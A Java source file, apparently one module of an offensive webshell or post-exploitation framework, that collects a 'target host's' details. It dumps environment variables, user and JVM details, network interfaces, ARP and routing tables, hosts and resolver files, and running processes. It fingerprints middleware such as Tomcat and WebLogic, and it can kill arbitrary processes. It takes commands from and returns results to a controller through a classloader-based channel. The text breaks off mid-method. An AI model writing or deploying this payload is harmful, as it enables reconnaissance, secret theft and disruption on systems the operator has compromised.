package org.leo.core.component;

import java.io.File;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.lang.management.ManagementFactory;
import java.lang.management.MemoryMXBean;
import java.lang.management.RuntimeMXBean;
import java.lang.management.ThreadMXBean;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Date;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

/**
 * 收集目标主机的硬件、操作系统、Java 运行时、网络、中间件和 Web 框架信息。
 * 保持 Java 6 字节码与独立 payload 约束。
 *
 * @author LeoSpring
 */
public class BasicInfoComponent implements Runnable {

    // 常量定义
    private static final long BYTES_TO_MB = 1024 * 1024;

    // 时间格式化常量
    private static final long MILLIS_PER_SECOND = 1000;
    private static final long MILLIS_PER_MINUTE = 60 * MILLIS_PER_SECOND;
    private static final long MILLIS_PER_HOUR = 60 * MILLIS_PER_MINUTE;
    private static final long MILLIS_PER_DAY = 24 * MILLIS_PER_HOUR;

    private static final long MIDDLEWARE_CACHE_TTL_MS = 10 * 60 * 1000;

    private static volatile Object osBean;
    private static volatile boolean sunOsBeanResolved;
    private static volatile Class<?> sunOsBeanClass;
    private static volatile RuntimeMXBean runtimeBean;
    private static volatile MemoryMXBean memoryBean;
    private static volatile ThreadMXBean threadBean;
    private static volatile String hostName;
    private static volatile Map<String, Object> middlewareInfo;
    private static volatile long middlewareCacheTime;

    private ClassLoader currentThreadClassLoader;

    // 组件接口字段
    private HashMap<String, Object> params;
    private HashMap<String, Object> results;

    
    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            Object rawParams = h.invoke(null, null, null);
            params = rawParams instanceof HashMap
                    ? (HashMap<String, Object>) rawParams : new HashMap<String, Object>();
            results = new java.util.HashMap<String, Object>();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap<String, Object>();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }


    /**
     * 主要执行方法
     */
    public void invoke() {
        currentThreadClassLoader = Thread.currentThread().getContextClassLoader();
        String action = params != null && params.get("action") != null
                ? String.valueOf(params.get("action")) : "basic";
        if ("processes".equals(action)) {
            List<Map<String, Object>> processes = getProcessesInfo();
            results.put("processes", processes);
            results.put("total", Integer.valueOf(processes.size()));
            results.put("source", processCollectionSource());
            results.put("os", System.getProperty("os.name", ""));
            results.put("code", Integer.valueOf(200));
            return;
        }
        if ("killProcess".equals(action)) {
            int pid = params.get("pid") instanceof Number
                    ? ((Number) params.get("pid")).intValue() : -1;
            boolean force = Boolean.TRUE.equals(params.get("force"));
            Boolean terminated = terminateWithProcessHandle(pid, force);
            results.put("handled", Boolean.valueOf(terminated != null));
            results.put("terminated", Boolean.valueOf(Boolean.TRUE.equals(terminated)));
            results.put("pid", Integer.valueOf(pid));
            results.put("code", Integer.valueOf(terminated == null ? 501 : 200));
            return;
        }
        if ("disks".equals(action)) {
            List<Map<String, Object>> disks = getFileStoreInfo();
            results.put("disks", disks);
            results.put("total", Integer.valueOf(disks.size()));
            results.put("source", "java-file-store");
            results.put("os", System.getProperty("os.name", ""));
            results.put("code", Integer.valueOf(200));
            return;
        }
        if ("network".equals(action)) {
            results.put("interfaces", getNetworkInfo());
            results.put("os", System.getProperty("os.name", ""));
            putFileIfPresent(results, "procArp", "/proc/net/arp", 64 * 1024);
            putFileIfPresent(results, "procRoute", "/proc/net/route", 64 * 1024);
            putFileIfPresent(results, "resolvConf", "/etc/resolv.conf", 64 * 1024);
            putFileIfPresent(results, "hosts", isWindows()
                    ? System.getenv("SystemRoot") + "\\System32\\drivers\\etc\\hosts"
                    : "/etc/hosts", 128 * 1024);
            results.put("code", Integer.valueOf(200));
            return;
        }
        if ("resolveDns".equals(action)) {
            String hostname = params.get("hostname") == null ? "" : String.valueOf(params.get("hostname"));
            List<String> addresses = new ArrayList<String>();
            if (hostname.length() > 0) {
                try {
                    InetAddress[] resolved = InetAddress.getAllByName(hostname);
                    for (int i = 0; i < resolved.length; i++) addresses.add(resolved[i].getHostAddress());
                } catch (Exception error) {
                    results.put("msg", error.getMessage());
                }
            }
            results.put("hostname", hostname);
            results.put("addresses", addresses);
            results.put("code", Integer.valueOf(hostname.length() == 0 ? 400
                    : addresses.isEmpty() ? 404 : 200));
            return;
        }
        Map<String, Object> basicInfo = new HashMap<String, Object>();
        basicInfo.put("collectTime", Long.valueOf(System.currentTimeMillis()));
        basicInfo.put("HardwareInfo", getHardwareInfo());
        basicInfo.put("OSInfo", getOSInfo());
        basicInfo.put("MiddlewareInfo", getMiddlewareInfo());
        basicInfo.put("JavaRuntimeInfo", getJavaRuntimeInfo());
        basicInfo.put("UserInfo", getUserInfo());
        basicInfo.put("EnvironmentInfo", new HashMap<String, String>(System.getenv()));
        basicInfo.put("NetworkInfo", getNetworkInfo());
        basicInfo.put("FileSystemInfo", getFileSystemInfo());
        basicInfo.put("ProcessInfo", getProcessInfo());
        basicInfo.put("WebFramework", detectWebFramework());
        results.put("BasicInfo", basicInfo);
        results.put("code", 200);
    }

    /**
     * 获取硬件信息
     */
    public Map<String, Object> getHardwareInfo() {
        Map<String, Object> info = new HashMap<String, Object>();
        try {
            java.lang.management.OperatingSystemMXBean stdOs = ManagementFactory.getOperatingSystemMXBean();
            info.put("AvailableProcessors", Integer.valueOf(stdOs.getAvailableProcessors()));
            info.put("SystemLoadAverage", formatLoadAverage(stdOs.getSystemLoadAverage()));

            // 尝试 com.sun.management 扩展方法（反射）
            Object sunOs = getSunOsBean();
            if (sunOs != null) {
                Class<?> sunOsClass = getSunOsBeanClass(); // 用接口 Class 查方法，而非实现类

                long totalPhysical = invokeLongMethod(sunOs, sunOsClass, "getTotalPhysicalMemorySize", -1L);
                long freePhysical = invokeLongMethod(sunOs, sunOsClass, "getFreePhysicalMemorySize", -1L);

                if (totalPhysical > 0 && freePhysical >= 0) {
                    long usedPhysical = totalPhysical - freePhysical;
                    info.put("TotalPhysicalMemoryMB", Long.valueOf(bytesToMB(totalPhysical)));
                    info.put("FreePhysicalMemoryMB", Long.valueOf(bytesToMB(freePhysical)));
                    info.put("UsedPhysicalMemoryMB", Long.valueOf(bytesToMB(usedPhysical)));
                    info.put("PhysicalMemoryUsagePercent", Double.valueOf(calculateUsagePercent(usedPhysical, totalPhysical)));
                }

                long totalSwap = invokeLongMethod(sunOs, sunOsClass, "getTotalSwapSpaceSize", -1L);
                long freeSwap = invokeLongMethod(sunOs, sunOsClass, "getFreeSwapSpaceSize", -1L);

                if (totalSwap > 0 && freeSwap >= 0) {
                    long usedSwap = totalSwap - freeSwap;
                    info.put("TotalSwapSpaceMB", Long.valueOf(bytesToMB(totalSwap)));
                    info.put("FreeSwapSpaceMB", Long.valueOf(bytesToMB(freeSwap)));
                    info.put("UsedSwapSpaceMB", Long.valueOf(bytesToMB(usedSwap)));
                    info.put("SwapUsagePercent", Double.valueOf(calculateUsagePercent(usedSwap, totalSwap)));
                }
            } else {
                info.put("note", "com.sun.management not available, physical memory info unavailable");
            }

        } catch (Exception e) {
            info.put("error", "failed to get hardware info: " + e.getMessage());
        }
        return info;
    }

    /**
     * 获取操作系统信息
     */
    public Map<String, Object> getOSInfo() {
        Map<String, Object> info = new HashMap<String, Object>();
        try {
            java.lang.management.OperatingSystemMXBean stdOs = ManagementFactory.getOperatingSystemMXBean();
            String host = getHostNameSafe();

            info.put("OSName", stdOs.getName());
            info.put("OSVersion", stdOs.getVersion());
            info.put("OSArch", stdOs.getArch());
            info.put("HostName", host);
            info.put("SystemUptime", formatUptime(getRuntimeBean().getUptime()));
            info.put("StartTime", Long.valueOf(getRuntimeBean().getStartTime()));

        } catch (Exception e) {
            info.put("error", "failed to get OS info: " + e.getMessage());
        }
        return info;
    }

    /**
     * 获取中间件信息
     */
    public Map<String, Object> getMiddlewareInfo() {
        long now = System.currentTimeMillis();
        long cacheAge = now - middlewareCacheTime;
        if (middlewareInfo != null && cacheAge >= 0 && cacheAge < MIDDLEWARE_CACHE_TTL_MS) {
            return new HashMap<String, Object>(middlewareInfo);
        }

        String middlewareType = detectMiddleware();
        Map<String, Object> info = new HashMap<String, Object>();
        info.put("MiddlewareType", middlewareType);
        try {
            if ("Tomcat".equals(middlewareType)) {
                info.put("Version", getTomcatVersion());
                info.put("Home", System.getProperty("catalina.home"));
                info.put("Base", System.getProperty("catalina.base"));
            } else if ("WebLogic".equals(middlewareType)) {
                info.put("Version", Class.forName("weblogic.version", false, currentThreadClassLoader)
                        .getMethod("getVersions").invoke(null));
                info.put("Home", System.getProperty("weblogic.home"));
                info.put("Domain", System.getProperty("weblogic.domain"));
            } else if ("WebSphere".equals(middlewareType)) {
                info.put("Version", System.getProperty("was.install.root"));
                info.put("Home", System.getProperty("was.install.root"));
            } else if ("Apusic".equals(middlewareType)) {
                info.put("Version", System.getProperty("APP_SERVER_VERSION"));
                info.put("Home", System.getProperty("APP_SERVER_HOME"));
            } else if ("Resin".equals(middlewareType)) {
                info.put("Version", Class.forName("com.caucho.Version", false, currentThreadClassLoader)
                        .getField("FULL_VERSION").get(null));
                info.put("Home", System.getProperty("APP_SERVER_HOME"));
            } else if ("Jetty".equals(middlewareType)) {
                info.put("Version", Class.forName("org.eclipse.jetty.util.Jetty", false,
                        currentThreadClassLoader).getField("VERSION").get(null));
                info.put("Home", firstProperty("jetty.base", "jetty.home"));
            } else if ("Undertow".equals(middlewareType)) {
                Class<?> version = Class.forName("io.undertow.Version", false, currentThreadClassLoader);
                info.put("Version", version.getMethod("getFullVersionString").invoke(null));
                info.put("Home", firstProperty("user.dir", "java.io.tmpdir"));
            } else if ("WildFly/JBoss".equals(middlewareType)) {
                info.put("Version", firstProperty("jboss.product.version", "jboss.as.version"));
                info.put("Home", firstProperty("jboss.server.base.dir", "jboss.home.dir"));
            } else if ("WebSphere Liberty".equals(middlewareType)) {
                info.put("Version", firstProperty("wlp.product.version", "java.runtime.version"));
                info.put("Home", firstProperty("wlp.install.dir", "server.config.dir"));
            } else if ("GlassFish/Payara".equals(middlewareType)) {
                info.put("Version", firstProperty("product.name", "glassfish.version"));
                info.put("Home", firstProperty("com.sun.aas.installRoot", "com.sun.aas.instanceRoot"));
            } else if ("TongWeb".equals(middlewareType)) {
                info.put("Version", firstProperty("tongweb.version", "server.version"));
                info.put("Home", firstProperty("tongweb.home", "server.home"));
            } else if ("BES".equals(middlewareType)) {
                info.put("Version", firstProperty("bes.version", "server.version"));
                info.put("Home", firstProperty("bes.home", "server.home"));
            } else {
                info.put("Version", "unknown");
            }
        } catch (Exception e) {
            info.put("Version", "unknown");
            info.put("Error", e.getMessage());
        }

        middlewareInfo = info;
        middlewareCacheTime = now;
        return new HashMap<String, Object>(info);
    }

    /**
     * 获取Java运行时信息
     */
    public Map<String, Object> getJavaRuntimeInfo() {
        Map<String, Object> javaInfo = new HashMap<String, Object>();
        try {
            RuntimeMXBean runtime = getRuntimeBean();
            MemoryMXBean memory = getMemoryBean();
            Runtime runtimeInstance = Runtime.getRuntime();

            // JVM 基本信息
            javaInfo.put("JVMName", System.getProperty("java.vm.name"));
            javaInfo.put("JVMVersion", System.getProperty("java.vm.version"));
            javaInfo.put("JavaVersion", System.getProperty("java.version"));
            javaInfo.put("JavaHome", System.getProperty("java.home"));
            javaInfo.put("JavaVendor", System.getProperty("java.vendor"));

            // JVM 启动参数
            javaInfo.put("JVMArguments", runtime.getInputArguments());
            javaInfo.put("ClassPath", runtime.getClassPath());

            try {
                javaInfo.put("BootClassPath", runtime.getBootClassPath());
            } catch (UnsupportedOperationException e) {
                javaInfo.put("BootClassPath", "N/A (Java 9+ module system)");
            }

            // JVM 内存信息
            long totalMemory = runtimeInstance.totalMemory();
            long freeMemory = runtimeInstance.freeMemory();
            long maxMemory = runtimeInstance.maxMemory();
            long usedMemory = totalMemory - freeMemory;

            javaInfo.put("TotalMemoryMB", Long.valueOf(bytesToMB(totalMemory)));
            javaInfo.put("FreeMemoryMB", Long.valueOf(bytesToMB(freeMemory)));
            javaInfo.put("UsedMemoryMB", Long.valueOf(bytesToMB(usedMemory)));
            javaInfo.put("MaxMemoryMB", Long.valueOf(bytesToMB(maxMemory)));
            javaInfo.put("MemoryUsagePercent", Double.valueOf(calculateUsagePercent(usedMemory, totalMemory)));

            // 堆内存信息
            long heapUsed = memory.getHeapMemoryUsage().getUsed();
            long heapMax = memory.getHeapMemoryUsage().getMax();
            javaInfo.put("HeapUsedMB", Long.valueOf(bytesToMB(heapUsed)));
            javaInfo.put("HeapMaxMB", Long.valueOf(bytesToMB(heapMax)));
            javaInfo.put("HeapUsagePercent", Double.valueOf(calculateUsagePercent(heapUsed, heapMax)));

            // 线程信息
            ThreadMXBean thread = getThreadBean();
            javaInfo.put("ThreadCount", Integer.valueOf(thread.getThreadCount()));
            javaInfo.put("PeakThreadCount", Integer.valueOf(thread.getPeakThreadCount()));
            javaInfo.put("TotalStartedThreadCount", Long.valueOf(thread.getTotalStartedThreadCount()));

        } catch (Exception e) {
            javaInfo.put("error", "failed to get Java runtime info: " + e.getMessage());
        }
        return javaInfo;
    }

    /**
     * 获取用户信息
     */
    public Map<String, Object> getUserInfo() {
        Map<String, Object> userInfo = new HashMap<String, Object>();
        try {
            userInfo.put("UserName", System.getProperty("user.name"));
            userInfo.put("UserHome", System.getProperty("user.home"));
            userInfo.put("UserDir", System.getProperty("user.dir"));
            userInfo.put("UserLanguage", System.getProperty("user.language"));
            userInfo.put("UserCountry", System.getProperty("user.country"));
            userInfo.put("UserTimezone", System.getProperty("user.timezone"));
        } catch (Exception e) {
            userInfo.put("error", "failed to get user info: " + e.getMessage());
        }
        return userInfo;
    }

    /**
     * 获取文件系统信息
     */
    public List<Map<String, Object>> getFileSystemInfo() {
        return getFileStoreInfo();
    }

    /** Java 7+ FileStore 反射路径，Java 6 自动回退 File.listRoots。 */
    private List<Map<String, Object>> getFileStoreInfo() {
        List<Map<String, Object>> stores = new ArrayList<Map<String, Object>>();
        try {
            Class<?> fileSystemsClass = Class.forName("java.nio.file.FileSystems");
            Class<?> fileSystemClass = Class.forName("java.nio.file.FileSystem");
            Object fileSystem = fileSystemsClass.getMethod("getDefault").invoke(null);
            Object iterable = fileSystemClass.getMethod("getFileStores").invoke(fileSystem);
            Iterator<?> iterator = ((Iterable<?>) iterable).iterator();
            Class<?> fileStoreClass = Class.forName("java.nio.file.FileStore");
            while (iterator.hasNext() && stores.size() < 256) {
                Object store = iterator.next();
                Map<String, Object> info = new HashMap<String, Object>();
                String storeText = String.valueOf(store);
                String mount = fileStoreMount(storeText);
                String name = String.valueOf(fileStoreClass.getMethod("name").invoke(store));
                String fsType = String.valueOf(fileStoreClass.getMethod("type").invoke(store));
                info.put("mount", mount);
                info.put("name", name);
                info.put("fsType", fsType);
                long total = ((Number) fileStoreClass.getMethod("getTotalSpace").invoke(store)).longValue();
                long free = ((Number) fileStoreClass.getMethod("getUsableSpace").invoke(store)).longValue();
                addSpaceInfo(info, total, free);
                stores.add(info);
            }
        } catch (Throwable ignored) {
            // Java 6 或受限运行时由 File.listRoots 路径接管。
        }
        if (!stores.isEmpty()) return stores;

        File[] roots;
        try { roots = File.listRoots(); } catch (Throwable ignored) { return stores; }
        if (roots == null) return stores;
        for (int i = 0; i < roots.length && stores.size() < 256; i++) {
            File root = roots[i];
            Map<String, Object> info = new HashMap<String, Object>();
            info.put("mount", root.getPath());
            info.put("name", root.getPath());
            info.put("fsType", "File System");
            long total = invokeFileSpaceMethod(root, "getTotalSpace");
            long free = invokeFileSpaceMethod(root, "getUsableSpace");
            addSpaceInfo(info, total, free);
            stores.add(info);
        }
        return stores;
    }

    private void addSpaceInfo(Map<String, Object> info, long total, long free) {
        if (total < 0L || free < 0L) return;
        info.put("totalBytes", Long.valueOf(total));
        info.put("freeBytes", Long.valueOf(free));
    }

    private String fileStoreMount(String storeText) {
        if (storeText == null) return "";
        String value = storeText.trim();
        int suffix = value.lastIndexOf(" (");
        return suffix > 0 ? value.substring(0, suffix).trim() : value;
    }

    /**
     * 获取网络信息
     */
    private List<Map<String, Object>> getNetworkInfo() {
        List<Map<String, Object>> networkInfo = new ArrayList<Map<String, Object>>();
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface networkInterface = interfaces.nextElement();
                Map<String, Object> interfaceInfo = new HashMap<String, Object>();
                interfaceInfo.put("Name", networkInterface.getName());
                interfaceInfo.put("DisplayName", networkInterface.getDisplayName());
                interfaceInfo.put("IsUp", Boolean.valueOf(networkInterface.isUp()));
                interfaceInfo.put("IsLoopback", Boolean.valueOf(networkInterface.isLoopback()));
                interfaceInfo.put("IsPointToPoint", Boolean.valueOf(networkInterface.isPointToPoint()));
                interfaceInfo.put("IsVirtual", Boolean.valueOf(networkInterface.isVirtual()));
                interfaceInfo.put("MTU", Integer.valueOf(networkInterface.getMTU()));

                // 获取 MAC 地址
                byte[] mac = networkInterface.getHardwareAddress();
                if (mac != null) {
                    interfaceInfo.put("MACAddress", formatMacAddress(mac));
                }

                // 获取 IP 地址
                Enumeration<InetAddress> addresses = networkInterface.getInetAddresses();
                List<String> ipAddresses = new ArrayList<String>();
                while (addresses.hasMoreElements()) {
                    InetAddress addr = addresses.nextElement();
                    ipAddresses.add(addr.getHostAddress());
                }
                interfaceInfo.put("IPAddresses", ipAddresses);
                networkInfo.add(interfaceInfo);
            }
        } catch (Exception e) {
            Map<String, Object> errorInfo = new HashMap<String, Object>();
            errorInfo.put("error", "failed to get network info: " + e.getMessage());
            networkInfo.add(errorInfo);
        }
        return networkInfo;
    }

    /**
     * 获取进程信息
     */
    private Map<String, Object> getProcessInfo() {
        Map<String, Object> processInfo = new HashMap<String, Object>();
        try {
            RuntimeMXBean runtime = getRuntimeBean();
            processInfo.put("ProcessId", getProcessId());
            processInfo.put("ProcessName", System.getProperty("sun.java.command"));
            processInfo.put("StartTime", Long.valueOf(runtime.getStartTime()));
            processInfo.put("Uptime", formatUptime(runtime.getUptime()));
        } catch (Exception e) {
            processInfo.put("error", "failed to get process info: " + e.getMessage());
        }
        return processInfo;
    }

    /** ProcessHandle → JNA → /proc，依次选择当前运行时可用路径。 */
    private List<Map<String, Object>> getProcessesInfo() {
        List<Map<String, Object>> processes = getProcessHandleProcesses();
        if (!processes.isEmpty()) return processes;
        processes = getJnaProcesses();
        if (!processes.isEmpty()) return processes;
        return getProcProcesses();
    }

    private String processCollectionSource() {
        try {
            Class.forName("java.lang.ProcessHandle");
            return "ProcessHandle";
        } catch (Throwable ignored) {
            if (isWindows()) return "JNA";
            return "/proc";
        }
    }

    private List<Map<String, Object>> getProcessHandleProcesses() {
        List<Map<String, Object>> processes = new ArrayList<Map<String, Object>>();
        Object stream = null;
        try {
            Class<?> handleClass = Class.forName("java.lang.ProcessHandle");
            Class<?> infoClass = Class.forName("java.lang.ProcessHandle$Info");
            Class<?> baseStreamClass = Class.forName("java.util.stream.BaseStream");
            stream = handleClass.getMethod("allProcesses").invoke(null);
            Iterator<?> iterator = (Iterator<?>) baseStreamClass.getMethod("iterator").invoke(stream);
            while (iterator.hasNext() && processes.size() < 2000) {
                Object handle = iterator.next();
                Map<String, Object> process = new HashMap<String, Object>();
                process.put("pid", handleClass.getMethod("pid").invoke(handle));
                process.put("alive", handleClass.getMethod("isAlive").invoke(handle));
                Object parent = optionalValue(handleClass.getMethod("parent").invoke(handle));
                if (parent != null) process.put("ppid", handleClass.getMethod("pid").invoke(parent));
                Object info = handleClass.getMethod("info").invoke(handle);
                putOptional(process, "cmd", infoClass.getMethod("commandLine").invoke(info));
                putOptional(process, "command", infoClass.getMethod("command").invoke(info));
                putOptional(process, "user", infoClass.getMethod("user").invoke(info));
                Object command = process.get("command");
                process.put("name", command == null ? "" : new File(String.valueOf(command)).getName());
                Object start = optionalValue(infoClass.getMethod("startInstant").invoke(info));
                if (start != null) {
                    process.put("startTime", start.getClass().getMethod("toEpochMilli").invoke(start));
                }
                Object cpu = optionalValue(infoClass.getMethod("totalCpuDuration").invoke(info));
                if (cpu != null) process.put("cpuMillis", cpu.getClass().getMethod("toMillis").invoke(cpu));
                processes.add(process);
            }
        } catch (Throwable ignored) {
            processes.clear();
        } finally {
            if (stream != null) {
                try { Class.forName("java.util.stream.BaseStream").getMethod("close").invoke(stream); }
                catch (Throwable ignored) {}
            }
        }
        return processes;
    }

    private Boolean terminateWithProcessHandle(int pid, boolean force) {
        if (pid <= 0) return Boolean.FALSE;
        try {
            Class<?> handleClass = Class.forName("java.lang.ProcessHandle");
            Object optional = handleClass.getMethod("of", long.class).invoke(null, Long.valueOf(pid));
            Object handle = optionalValue(optional);
            if (handle == null) return Boolean.FALSE;
            String method = force ? "destroyForcibly" : "destroy";
            return (Boolean) handleClass.getMethod(method).invoke(handle);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private void putOptional(Map<String, Object> target, String key, Object optional) throws Exception {
        Object value = optionalValue(optional);
        if (value != null) target.put(key, value);
    }

    private Object optionalValue(Object optional) throws Exception {
        if (optional == null) return null;
        Boolean present = (Boolean) optional.getClass().getMethod("isPresent").invoke(optional);
        return present.booleanValue() ? optional.getClass().getMethod("get").invoke(optional) : null;
    }

    /** Windows 可用 jna-platform 时走 EnumProcesses；其他环境自然落到 /proc。 */
    private List<Map<String, Object>> getJnaProcesses() {
        List<Map<String, Object>> processes = new ArrayList<Map<String, Object>>();
        if (!isWindows()) return processes;
        try {
            Class<?> psapiClass = Class.forName("com.sun.jna.platform.win32.Psapi");
            Class<?> kernelClass = Class.forName("com.sun.jna.platform.win32.Kernel32");
            Class<?> intRefClass = Class.forName("com.sun.jna.ptr.IntByReference");
            Object psapi = psapiClass.getField("INSTANCE").get(null);
            Object kernel = kernelClass.getField("INSTANCE").get(null);
            int[] pids = new int[4096];
            Object needed = intRefClass.newInstance();
            Method enumProcesses = findMethod(psapiClass, "EnumProcesses", 3);
            enumProcesses.invoke(psapi, pids, Integer.valueOf(pids.length * 4), needed);
            int count = ((Number) intRefClass.getMethod("getValue").invoke(needed)).intValue() / 4;
            Method openProcess = findMethod(kernelClass, "OpenProcess", 3);
            Method queryImage = findMethod(kernelClass, "QueryFullProcessImageName", 4);
            Method closeHandle = findMethod(kernelClass, "CloseHandle", 1);
            for (int i = 0; i < count && processes.size() < 2000; i++) {
                if (pids[i] <= 0) continue;
                Object handle = openProcess.invoke(kernel, Integer.valueOf(0x1000), Boolean.FALSE,
                        Integer.valueOf(pids[i]));
                if (handle == null) continue;
                try {
                    char[] path = new char[32768];
                    Object length = intRefClass.getConstructor(int.class).newInstance(Integer.valueOf(path.length));
                    Boolean ok = (Boolean) queryImage.invoke(kernel, handle, Integer.valueOf(0), path, length);
                    if (!ok.booleanValue()) continue;
                    int pathLength = ((Number) intRefClass.getMethod("getValue").invoke(length)).intValue();
                    String command = new String(path, 0, pathLength);
                    Map<String, Object> process = new HashMap<String, Object>();
                    process.put("pid", Integer.valueOf(pids[i]));
                    process.put("command", command);
                    process.put("cmd", command);
                    process.put("name", new File(command).getName());
                    processes.add(process);
                } finally {
                    closeHandle.invoke(kernel, handle);
                }
            }
        } catch (Throwable ignored) {
            processes.clear();
        }
        return processes;
    }

    private Method findMethod(Class<?> type, String name, int parameterCount) throws NoSuchMethodException {
        Method[] methods = type.getMethods();
        for (int i = 0; i < methods.length; i++) {
            if (name.equals(methods[i].getName())
                    && methods[i].getParameterTypes().length == parameterCount) return methods[i];
        }
        throw new NoSuchMethodException(name);
    }

    private List<Map<String, Object>> getProcProcesses() {
        List<Map<String, Object>> processes = new ArrayList<Map<String, Object>>();
        File[] entries = new File("/proc").listFiles();
        if (entries == null) return processes;
        for (int i = 0; i < entries.length && processes.size() < 2000; i++) {
            String name = entries[i].getName();
            if (!isDigits(name)) continue;
            String status = readTextFile(new File(entries[i], "status"), 64 * 1024);
            if (status == null) continue;
            Map<String, Object> process = new HashMap<String, Object>();
            process.put("pid", Integer.valueOf(parseInt(name, -1)));
            String[] lines = status.split("\\n");
            for (int line = 0; line < lines.length; line++) {
                int colon = lines[line].indexOf(':');
                if (colon <= 0) continue;
                String key = lines[line].substring(0, colon);
                String value = lines[line].substring(colon + 1).trim();
                if ("Name".equals(key)) process.put("name", value);
                else if ("PPid".equals(key)) process.put("ppid", Integer.valueOf(parseInt(value, -1)));
                else if ("Uid".equals(key)) process.put("user", value.split("\\s+")[0]);
                else if ("VmRSS".equals(key)) process.put("memKb", Long.valueOf(parseLeadingLong(value)));
            }
            String cmdline = readTextFile(new File(entries[i], "cmdline"), 256 * 1024);
            if (cmdline != null) process.put("cmd", cmdline.replace('\0', ' ').trim());
            processes.add(process);
        }
        return processes;
    }

    private boolean isDigits(String value) {
        if (value == null || value.length() == 0) return false;
        for (int i = 0; i < value.length(); i++) if (!Character.isDigit(value.charAt(i))) return false;
        return true;
    }

    private int parseInt(String value, int fallback) {
        try { return Integer.parseInt(value.trim()); } catch (Exception ignored) { return fallback; }
    }

    private long parseLeadingLong(String value) {
        if (value == null) return 0L;
        String[] fields = value.trim().split("\\s+");
        try { return Long.parseLong(fields[0]); } catch (Exception ignored) { return 0L; }
    }

    private void putFileIfPresent(Map<String, Object> target, String key, String path, int maxBytes) {
        if (path == null || path.startsWith("null")) return;
        String value = readTextFile(new File(path), maxBytes);
        if (value != null && value.length() > 0) target.put(key, value);
    }

    private String readTextFile(File file, int maxBytes) {
        if (file == null || !file.isFile()) return null;
        FileInputStream input = null;
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        try {
            input = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int total = 0;
            int read;
            while ((read = input.read(buffer, 0, Math.min(buffer.length, maxBytes - total))) > 0) {
                output.write(buffer, 0, read);
                total += read;
                if (total >= maxBytes) break;
            }
            return new String(output.toByteArray(), "UTF-8");
        } catch (Throwable ignored) {
            return null;
        } finally {
            if (input != null) try { input.close(); } catch (Throwable ignored) {}
            try { output.close(); } catch (Throwable ignored) {}
        }
    }

    private boolean isWindows() {
        return System.getProperty("os.name", "").toLowerCase().indexOf("windows") >= 0;
    }

    // ==================== 反射辅助方法 ====================

    /**
     * 通过反射获取 com.sun.management.OperatingSystemMXBean。
     */
    private static Object getSunOsBean() {
        if (sunOsBeanResolved) return osBean;
        synchronized (BasicInfoComponent.class) {
            if (sunOsBeanResolved) return osBean;
            try {
                java.lang.management.OperatingSystemMXBean stdOs = ManagementFactory.getOperatingSystemMXBean();
                sunOsBeanClass = Class.forName("com.sun.management.OperatingSystemMXBean");
                osBean = stdOs;
            } catch (ClassNotFoundException e) {
                osBean = null;
            }
            sunOsBeanResolved = true;
        }
        return osBean;
    }

    /**
     * 获取缓存的 com.sun.management.OperatingSystemMXBean 接口 Class
     */
    private static Class<?> getSunOsBeanClass() {
        return sunOsBeanClass;
    }

    /**
     * 反射调用返回 long 的无参方法
     */
    private static long invokeLongMethod(Object obj, Class<?> clazz, String methodName, long defaultValue) {
        try {
            Method m = clazz.getMethod(methodName);
            Object result = m.invoke(obj);
            if (result instanceof Number) {
                return ((Number) result).longValue();
            }
        } catch (Exception ignored) {
        }
        return defaultValue;
    }

    /**
     * 反射调用 File.getTotalSpace/getUsableSpace（Java 1.6+）
     * 返回 -1 表示方法不存在（Java 1.5）
     */
    private static long invokeFileSpaceMethod(File file, String methodName) {
        try {
            Method m = File.class.getMethod(methodName);
            Object result = m.invoke(file);
            if (result instanceof Number) {
                return ((Number) result).longValue();
            }
        } catch (Exception ignored) {
        }
        return -1L;
    }

    // ==================== MXBean 单例 ====================

    private static RuntimeMXBean getRuntimeBean() {
        if (runtimeBean == null) {
            synchronized (BasicInfoComponent.class) {
                if (runtimeBean == null) {
                    runtimeBean = ManagementFactory.getRuntimeMXBean();
                }
            }
        }
        return runtimeBean;
    }

    private static MemoryMXBean getMemoryBean() {
        if (memoryBean == null) {
            synchronized (BasicInfoComponent.class) {
                if (memoryBean == null) {
                    memoryBean = ManagementFactory.getMemoryMXBean();
                }
            }
        }
        return memoryBean;
    }

    private static ThreadMXBean getThreadBean() {
        if (threadBean == null) {
            synchronized (BasicInfoComponent.class) {
                if (threadBean == null) {
                    threadBean = ManagementFactory.getThreadMXBean();
                }
            }
        }
        return threadBean;
    }

    // ==================== 辅助方法 ====================

    /**
     * 优先读取环境变量，最后通过 InetAddress 获取主机名。
     */
    private static String getHostNameSafe() {
        if (hostName != null) {
            return hostName;
        }
        synchronized (BasicInfoComponent.class) {
            if (hostName != null) {
                return hostName;
            }

            String name = System.getenv("HOSTNAME");        // Linux
            if (name != null && name.length() > 0) {
                hostName = name;
                return hostName;
            }
            name = System.getenv("COMPUTERNAME");            // Windows
            if (name != null && name.length() > 0) {
                hostName = name;
                return hostName;
            }

            try {
                hostName = InetAddress.getLocalHost().getHostName();
            } catch (Exception e) {
                hostName = "unknown";
            }
        }
        return hostName;
    }

    private long bytesToMB(long bytes) {
        return bytes / BYTES_TO_MB;
    }

    private double calculateUsagePercent(long used, long total) {
        if (total <= 0) {
            return 0.0;
        }
        return Math.round((double) used / total * 1000) / 10.0;
    }

    /**
     * 格式化 MAC 地址
     */
    private String formatMacAddress(byte[] mac) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < mac.length; i++) {
            if (i > 0) {
                sb.append(':');
            }
            sb.append(hexByte(mac[i]));
        }
        return sb.toString();
    }

    /**
     * 单字节转两位十六进制（避免 String.format 开销）
     */
    private String hexByte(byte b) {
        int v = b & 0xFF;
        char hi = "0123456789ABCDEF".charAt(v >>> 4);
